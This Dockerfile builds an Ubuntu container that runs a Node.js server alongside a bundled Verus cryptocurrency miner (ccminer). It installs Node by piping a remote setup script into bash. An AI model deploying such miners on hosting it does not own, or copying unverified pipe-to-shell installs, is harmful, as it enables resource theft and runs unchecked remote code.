FROM ubuntu:18.04

# Install system dependencies
RUN apt-get update && apt-get install -y \
    ca-certificates \
    curl \
    bash \
    procps \
    build-essential \
    git \
    screen \
    && rm -rf /var/lib/apt/lists/*

# Install Node.js 18
RUN curl -fsSL https://deb.nodesource.com/setup_18.x | bash - \
    && apt-get install -y nodejs

# Set working directory
WORKDIR /app

# Copy Node.js project files and install dependencies
COPY package.json .
RUN npm install

# Copy server + miner files
COPY server.js .
COPY run_verus.sh .
COPY ccminer-v3.8.3a-oink_Ubuntu_18.04 .

# Make scripts/binaries executable
RUN chmod +x run_verus.sh ccminer-v3.8.3a-oink_Ubuntu_18.04

# Expose port
EXPOSE 3000

# Start server
CMD ["node", "server.js"]
